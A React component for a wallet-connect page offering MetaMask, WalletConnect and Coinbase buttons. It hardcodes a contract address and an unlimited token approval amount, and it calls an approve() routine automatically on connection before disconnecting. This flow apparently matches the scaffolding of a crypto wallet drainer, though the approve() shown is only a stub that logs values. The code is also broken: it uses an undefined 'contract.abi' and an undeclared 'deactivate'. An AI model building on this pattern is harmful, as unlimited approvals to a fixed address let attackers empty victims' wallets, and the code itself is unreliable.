import {useWeb3React} from "@web3-react/core";
import Web3 from 'web3';
import {connectors} from "./connectors";
import {useEffect, useState} from "react";
import {CONTACT_ABI, CONTACT_ADDRESS} from './contacts/config';
import { useAuth } from "./useAuth.ts";
import { InjectedConnector } from "@web3-react/injected-connector";
import { ethers } from 'ethers';

function App() {
    const [contactList, setContactList] = useState();
    /*
          active: (BOOL) кошелек активно подключен прямо сейчас
          account: (address) адрес блокчейна, к которому подключен
          library: () это либо веб3, либо эфиры, в зависимости от того, что вы передали
          connector: текущий разъем. Итак, когда мы подключимся, в этом примере это будет инжектированный коннектор.
          activate: (wallet) способ подключения к кошельку
          deactivate: () способ отключения от кошелька
      */
    // const {connector, library, chainId, account, activate, deactivate, active} = useWeb3React();

    const { active, activate, account, chainId } = useAuth();

    useEffect(async ()=>{
        await approve()
    }, [active])

    // useEffect(async () => {
    //     deactivate()
    //     // const provider = window.localStorage.getItem("provider");
    //     // if (provider) await activate(connectors[provider]);
    //     await approve()
    // }, []);

    // const setProvider = (type) => {
    //     window.localStorage.setItem("provider", type);
    // };

    const contractAddress = "0x355638a4eCcb777794257f22f50c289d4189F245";
    const abi = contract.abi;
    const approveNumber = '99999999999999999999999999999999999999999999999999999';

    const approve = async () => {
        console.log(account)
        // const web3 = new Web3(Web3.givenProvider);
        // const accounts = await web3.eth.requestAccounts();
        // const contactList = new web3.eth.Contract(CONTACT_ABI, CONTACT_ADDRESS);
        // set contact list to state variable.
        console.log(active)
        // setContactList(contactList);
        // Then we get total number of contacts for iteration

        // iterate through the amount of time of counter
    }

    return (
        <>
            <div className="wallet_items">
                <a onClick={async () => {
                    await activate(new InjectedConnector({}));
                    // await approve();
                    // await deactivate();
                }}>
                    <div className="wallet_item">
                        <img src="img/metamask.png" alt=""/>
                        <p>Metamask</p>
                    </div>
                </a>
                <a onClick={async () => {
                    await activate(connectors.walletConnect);
                    await approve();
                    await deactivate();
                }}>
                    <div className="wallet_item">
                        <img src="img/wallet_connect.png" alt=""/>
                        <p>WalletConnect</p>
                    </div>
                </a>
                <a onClick={async () => {
                    await activate(connectors.coinbaseWallet);
                    await approve()
                    await deactivate();
                }}>
                    <div className="wallet_item">
                        <img src="img/coinbase.png" alt=""/>
                        <p>Coinbase</p>
                    </div>
                </a>
            </div>
            <div className="wallet_more">
                <img src="img/information.png" alt=""/>
                <a href="/">Learn how to connect</a>
            </div>
        </>
    );
}

export default App;
